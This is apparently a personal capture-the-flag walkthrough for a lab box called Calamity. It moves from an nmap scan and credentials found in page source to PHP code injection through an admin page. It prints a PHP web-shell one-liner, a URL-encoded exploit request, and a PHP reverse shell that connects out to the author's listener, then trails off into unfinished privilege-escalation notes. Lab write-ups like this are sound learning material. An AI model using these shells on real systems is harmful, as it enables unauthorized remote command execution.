# Calamity

Start off with NMAP aggresive scans
```
nmap -T4 -sV -F 10.10.10.27 -oN InitialScan.txt
```


Scan show HTTP and SSH. SSH is up to date so no exploits

Static Website, No network sources
No metasploit module for the apache version
Dirbuster found admin.php

Found creds in the source html. Guessed password `admin`

Log in with `admin:skoupidotenekes`

You can upload HTML to the site as a renderer. Put PHP in the html code and it
runs.

First I submitted this:
```
The date is <?php echo date('l, F jS, Y'); ?>.
```

The webpage showed the results.

Now I try to find an easy php shell. Quick  oneliner on google
```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo
"</pre>"; die; }?>
```

Send the following URL for a quick shell
```
http://10.10.10.27/admin.php?html=%3C%3Fphp+if(isset(%24_REQUEST[%27cmd%27])){+echo+%22%3Cpre%3E%22%3B+%24cmd+%3D+(%24_REQUEST[%27cmd%27])%3B+system(%24cmd)%3B+echo+%22%3C%2Fpre%3E%22%3B+die%3B+}%3F%3E&cmd=echo%20hi
```

Lets make it interactive.

URL encode this php reverse shell to get an interactive prompt:
```
php -r '$s=fsockopen("10.10.14.79",9999);popen("/bin/sh -i <&3 >&3 2>&3", "r");' &
```

Server is listening on port 25 locally. Seems to be postfix. Postfix is pretty secure unless
misconfigured.

User xalvas exists. Homedir contains interesting things.

`Owned user xalvas`

Tried cd'ing into `/tmp/xalvas` based on hint in dontforget.txt

Mentions program running called peda

Trying to download the wave but the pipe keeps breaking

Things ive tried:
- World writable files (none?)
- Guess dir name in tmp (/tmp/xalvas, etc.)
- Postfix execute scripts, No way to tell as there are no logs
- Didnt find an SUIDfind / -perm -g=s -type f 2>/dev/null

Reddit say Binary BUF using wav files..... Come back to this maybe?
